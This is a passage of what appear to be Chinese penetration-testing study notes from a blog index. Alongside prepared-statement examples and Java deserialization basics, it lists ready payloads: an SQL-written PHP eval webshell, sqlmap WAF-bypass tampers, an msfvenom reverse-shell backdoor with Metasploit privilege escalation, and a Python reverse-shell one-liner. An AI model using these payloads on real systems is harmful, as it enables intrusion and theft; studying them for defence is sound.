single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">// 关闭语句和连接</span><span class="token variable">$stmt</span><span class="token operator">-&gt;</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span><span class="token operator">-&gt;</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-1-2-java预编译"><a href="#3-1-2-java预编译" class="headerlink" title="3.1.2 java预编译"></a>3.1.2 java预编译</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JdbcExample</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// 数据库连接信息</span>        <span class="token class-name">String</span> url <span class="token operator">=</span> <span class="token string">"jdbc:mysql://localhost:3306/your_database"</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> user <span class="token operator">=</span> <span class="token string">"your_username"</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> password <span class="token operator">=</span> <span class="token string">"your_password"</span><span class="token punctuation">;</span>        <span class="token comment">// 数据库连接、PreparedStatement 和结果集</span>        <span class="token class-name">Connection</span> conn <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token class-name">PreparedStatement</span> pstmt <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token class-name">ResultSet</span> rs <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token comment">// 1. 加载 JDBC 驱动</span>            <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.mysql.cj.jdbc.Driver"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 2. 获取数据库连接</span>            conn <span class="token operator">=</span> <span class="token class-name">DriverManager</span><span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> user<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 3. 创建预编译查询语句</span>            <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"SELECT * FROM users WHERE username = ? AND age = ?"</span><span class="token punctuation">;</span>            pstmt <span class="token operator">=</span> conn<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 4. 设置参数</span>            pstmt<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"john_doe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 第一个问号绑定值</span>            pstmt<span class="token punctuation">.</span><span class="token function">setInt</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">// 第二个问号绑定值</span>            <span class="token comment">// 5. 执行查询</span>            rs <span class="token operator">=</span> pstmt<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 6. 处理结果集</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>rs<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">int</span> id <span class="token operator">=</span> rs<span class="token punctuation">.</span><span class="token function">getInt</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">String</span> username <span class="token operator">=</span> rs<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">int</span> age <span class="token operator">=</span> rs<span class="token punctuation">.</span><span class="token function">getInt</span><span class="token punctuation">(</span><span class="token string">"age"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>id <span class="token operator">+</span> <span class="token string">" - "</span> <span class="token operator">+</span> username <span class="token operator">+</span> <span class="token string">" - "</span> <span class="token operator">+</span> age<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SQLException</span> <span class="token operator">|</span> <span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>            <span class="token comment">// 7. 关闭资源</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>rs <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    rs<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>pstmt <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    pstmt<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>conn <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    conn<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SQLException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-利用"><a href="#4-利用" class="headerlink" title="4. 利用"></a>4. 利用</h2><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select "&lt;?php @eval($_POST['cmd']); ?&gt;" into outfile '/var/www/html/shell.php'  #into outfile 写文件select "&lt;?php @eval($_POST['cmd']); ?&gt;" dumpfile '/var/www/html/shell.php'  # dumpfile 写文件select load_file('/etc/passwd')    # load_file()读文件SQL_Server 数据库中可以直接执行系统命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-SQLmap绕过"><a href="#5-SQLmap绕过" class="headerlink" title="5.SQLmap绕过"></a>5.SQLmap绕过</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"> --tamper<span class="token operator">=</span>xxxxapostrophemadk  <span class="token comment"># 绕过单引号</span>space2comment  <span class="token comment">#将空格替换为 /**/ 注释</span>base64encode   <span class="token comment"># base64编码</span>multiplespaces  <span class="token comment">#多个空格绕过</span>space2plus  <span class="token comment">#空格替换为加号</span>space2hash  <span class="token comment"># 将空格替换为哈希字符</span>space2mssqlblank    <span class="token comment">#空格替换为 MSSQL 注释</span>space2randomblank  <span class="token comment">#随机替换空格，增加检测难度</span><span class="token assign-left variable">tamper</span><span class="token operator">=</span>charencode   <span class="token comment"># 将 SQL 关键字转为 ASCII 编码</span>between<span class="token comment"># 将 = 变为 BETWEEN。</span>like   <span class="token comment"># 将 = 变为 LIKE</span>randomcase   <span class="token comment"># 随机改变 SQL 关键字的大小写</span>unionalltounion    <span class="token comment">#将 UNION ALL 替换为 UNION，绕过检测</span><span class="token assign-left variable">tamper</span><span class="token operator">=</span>securesphere   <span class="token comment">#绕过 Barracuda WAF</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提权</title>
      <link href="/2024/11/20/web-an-quan/ti-quan/"/>
      <url>/2024/11/20/web-an-quan/ti-quan/</url>
      
        <content type="html"><![CDATA[<h2 id="1-系统内核漏洞提权"><a href="#1-系统内核漏洞提权" class="headerlink" title="1.系统内核漏洞提权"></a>1.系统内核漏洞提权</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">uname</span> -a  <span class="token comment">#查看系统内核和版本信息</span>然后searchexploit查找漏洞的exp或者http://www.exploit-db.com/漏洞利用平台<span class="token comment"># 如：找 Linux kali 6.8.11-amd64 exploit</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-uid提权"><a href="#2-uid提权" class="headerlink" title="2.uid提权"></a>2.uid提权</h2><h2 id="3-msf提权"><a href="#3-msf提权" class="headerlink" title="3.msf提权"></a>3.msf提权</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 生成反弹shell后门</span>msfvenom -p linux/x64/meterpreter/reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token operator">&lt;</span>local_ip<span class="token operator">&gt;</span> <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">7777</span> -f elf <span class="token operator">&gt;</span> ~/houmen.elfmsfconsoleuse exploit/multi/handler  <span class="token comment"># 开启监听</span><span class="token builtin class-name">set</span> payload linux/x64/meterpreter/reverse_tcp<span class="token builtin class-name">set</span> lhost <span class="token operator">&lt;</span>local_ip<span class="token operator">&gt;</span><span class="token builtin class-name">set</span> lport <span class="token number">7777</span>runbackgrounduse post/multi/recon/local_exploit_suggester  <span class="token comment"># 查找该session可用的提权exp</span><span class="token comment">#post/multi/recon/local_exploit_suggester 是一个用于渗透测试中的后渗透分析模块，帮助测试人员在目标系统中识别和利用本地漏洞，提升权限或执行其他有用的攻击。</span><span class="token builtin class-name">set</span> session <span class="token number">1</span>runuse <span class="token number">1</span><span class="token punctuation">(</span>local_exploit_suggester模块扫描出的可用的exp<span class="token punctuation">)</span><span class="token builtin class-name">set</span> session <span class="token number">1</span>runshell  <span class="token comment"># meterpreter后渗透模块下创建shell</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-sudo提权"><a href="#4-sudo提权" class="headerlink" title="4.sudo提权"></a>4.sudo提权</h2>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一句话木马</title>
      <link href="/2024/11/19/web-an-quan/yi-ju-hua-mu-ma/"/>
      <url>/2024/11/19/web-an-quan/yi-ju-hua-mu-ma/</url>
      
        <content type="html"><![CDATA[<h2 id="1-php一句话木马"><a href="#1-php一句话木马" class="headerlink" title="1.php一句话木马"></a>1.php一句话木马</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>.htaccess配置文件</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FilesMatch</span> <span class="token attr-name">"1.jpg"</span><span class="token punctuation">&gt;</span></span>sethandler application/x-httpd-php<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FilesMatch</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="2-python一句话木马反弹shell"><a href="#2-python一句话木马反弹shell" class="headerlink" title="2.python一句话木马反弹shell"></a>2.python一句话木马反弹shell</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python -c <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;lhost&gt;",&lt;port&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用python反弹shell木马获得shell后，<code>python -c 'import pty; pty.spawn("/bin/bash")'</code>获得pty.</p><p>pty(创建一个伪终端):用于在当前的终端中启动一个新的 Bash shell，并让它的输入/输出与当前终端进行更好的交互，获得一个有更好交互性的shell。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pop3登录指令</title>
      <link href="/2024/11/19/web-an-quan/pop3-deng-lu-zhi-ling/"/>
      <url>/2024/11/19/web-an-quan/pop3-deng-lu-zhi-ling/</url>
      
        <content type="html"><![CDATA[<p>hydra暴力破解pop3用户名密码后，使用nc 登录进去</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">nc</span> <span class="token number">192.168</span>.18.20 <span class="token operator">&lt;</span>port<span class="token operator">&gt;</span>user <span class="token operator">&lt;</span>username<span class="token operator">&gt;</span>pass <span class="token operator">&lt;</span>password<span class="token operator">&gt;</span>list  <span class="token comment"># 返回每个邮件的大小</span>retr <span class="token operator">&lt;</span>id<span class="token operator">&gt;</span>  <span class="token comment"># 查看id为这个的邮件的内容</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2024/11/19/web-an-quan/pop3-deng-lu-zhi-ling/image-20241119215433088.png" alt="image-20241119215433088"></p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>md5加密后为0的字符串</title>
      <link href="/2024/11/19/web-an-quan/md5-jia-mi-hou-wei-0-de-zi-fu-chuan/"/>
      <url>/2024/11/19/web-an-quan/md5-jia-mi-hou-wei-0-de-zi-fu-chuan/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-none"><code class="language-none">MD5加密后==’0’ 总结常用的：240610708，aabg7XSs，aabC9RqSs878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反射机制</title>
      <link href="/2024/10/22/java-an-quan/java-fan-xu-lie-hua/"/>
      <url>/2024/10/22/java-an-quan/java-fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<h2 id="一、反射式编程"><a href="#一、反射式编程" class="headerlink" title="一、反射式编程"></a>一、反射式编程</h2><p>指计算机程序在运行时可以访问、检测和修改它本身状态或行为的一种能力。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Class</span>     <span class="token comment">//获取类对象</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span>  <span class="token comment">//获取类对象</span>newInstance     <span class="token comment">//实例化类对象</span>getMethod  <span class="token comment">//获取类方法</span>invoke<span class="token comment">//执行方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>###1.在JVM中，类加载的过程</p><p>加载—–&gt;验证—–&gt;准备—–&gt;解析—–&gt;初始化</p><p>初始化：执行类构造器<code>&lt;clinit&gt;()</code>的过程       </p><p>​              自动收集类中的所有类变量的赋值动作和静态语句块(static{}块)中的语句并产生。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">getConstructor    <span class="token comment">//根据接收的构造函数列表类型参数获取对应的构造函数</span><span class="token class-name">Class</span> c <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.ProcessBuilder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token class-name">List</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Object</span> o <span class="token operator">=</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Array</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">ProcessBuilder</span><span class="token punctuation">)</span>o<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>getDeclaredMethod    <span class="token comment">//获取当前类声明的所有方法，包括私有方法</span>setAccessible <span class="token comment">//设置作用域，可以用于字段、方法等</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>##二、Java序列化原理</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment">//反序列化函数</span><span class="token function">writeObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//序列化函数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="1-Java反序列化漏洞原理"><a href="#1-Java反序列化漏洞原理" class="headerlink" title="1.Java反序列化漏洞原理"></a>1.Java反序列化漏洞原理</h3><p>将带有恶意属性值的对象序列化值进行反序列化操作时，自动执行的函数调用链将恶意属性利用，最终造成恶意函数的执行。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">MyObject</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token comment">//重写readObject()方法</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ObjectInputStream</span> in<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span><span class="token class-name">ClassNotFoundException</span><span class="token punctuation">{</span>        <span class="token comment">//执行默认的readObject()方法</span>        in<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//执行打开计算器程序命令</span>        <span class="token class-name">Runtime</span><span class="token punctuation">.</span>getRuntime<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"open /Application/Calculator.app/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjson反序列化</title>
      <link href="/2024/09/30/java-an-quan/fastjson-fan-xu-lie-hua/"/>
      <url>/2024/09/30/java-an-quan/fastjson-fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<h2 id="1-fastjson介绍"><a href="#1-fastjson介绍" class="headerlink" title="1.fastjson介绍"></a>1.fastjson介绍</h2><p><code>fastjson</code>是<code>java</code>中处理序列化与返学列化的一个库，<code>fastjson.Json</code>将<code>java</code>类序列化<code>json</code>格式的字符串，<code>fastjson.parse和fastjson.Objectparse</code>将<code>json</code>格式的字符串反序列化为<code>java</code>类。</p><p>导入<code>maven</code>依赖</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">&gt;</span></span><span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">&gt;</span></span>com<span class="token punctuation">.</span>alibaba<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span><span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">&gt;</span></span>fastjson<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span><span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">&gt;</span></span><span class="token number">1.2</span><span class="token number">.24</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试类</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token comment">//无参调用</span>    <span class="token keyword">public</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token comment">//全参调用</span>    <span class="token keyword">public</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span><span class="token keyword">int</span> age<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token operator">=</span>name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token operator">=</span>age<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">//getter和setter方法</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"调用了getAge"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> age<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"调用了setAge"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"调用了getName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"调用了setName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"{\"name\":\""</span><span class="token operator">+</span>name<span class="token operator">+</span><span class="token string">'\"'</span><span class="token operator">+</span><span class="token string">",\"age\":"</span><span class="token operator">+</span>age<span class="token operator">+</span><span class="token string">'}'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" 